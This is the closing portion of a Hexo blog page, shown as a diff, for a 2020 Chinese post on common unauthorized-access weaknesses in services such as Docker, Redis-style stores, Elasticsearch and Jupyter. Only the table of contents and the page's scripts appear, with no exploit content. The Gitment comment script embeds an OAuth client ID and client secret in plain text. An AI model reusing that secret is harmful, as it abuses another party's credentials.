未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-4"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="toc-nav-number">6.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#VNC-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">VNC 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-5"><span class="toc-nav-number">7.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-5"><span class="toc-nav-number">7.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="toc-nav-number">7.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Docker-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">8.</span> <span class="toc-nav-text">Docker 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-6"><span class="toc-nav-number">8.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-6"><span class="toc-nav-number">8.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-6"><span class="toc-nav-number">8.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#ZooKeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">9.</span> <span class="toc-nav-text">ZooKeeper 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-7"><span class="toc-nav-number">9.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-7"><span class="toc-nav-number">9.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-7"><span class="toc-nav-number">9.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Rsync-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">10.</span> <span class="toc-nav-text">Rsync 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-8"><span class="toc-nav-number">10.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-8"><span class="toc-nav-number">10.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-8"><span class="toc-nav-number">10.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Atlassian-Crowd-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">11.</span> <span class="toc-nav-text">Atlassian Crowd 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-9"><span class="toc-nav-number">11.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-9"><span class="toc-nav-number">11.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-9"><span class="toc-nav-number">11.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CouchDB-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">12.</span> <span class="toc-nav-text">CouchDB 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-10"><span class="toc-nav-number">12.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-10"><span class="toc-nav-number">12.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-10"><span class="toc-nav-number">12.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Elasticsearch-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">13.</span> <span class="toc-nav-text">Elasticsearch 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-11"><span class="toc-nav-number">13.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-11"><span class="toc-nav-number">13.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-11"><span class="toc-nav-number">13.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Hadoop-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">14.</span> <span class="toc-nav-text">Hadoop 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-12"><span class="toc-nav-number">14.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-12"><span class="toc-nav-number">14.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-12"><span class="toc-nav-number">14.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">15.</span> <span class="toc-nav-text">Jupyter Notebook 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-13"><span class="toc-nav-number">15.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-13"><span class="toc-nav-number">15.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-13"><span class="toc-nav-number">15.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-nav-number">16.</span> <span class="toc-nav-text">监听端口</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">17.</span> <span class="toc-nav-text">参考</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2020/07/11/常见未授权访问/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "常见未授权访问",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
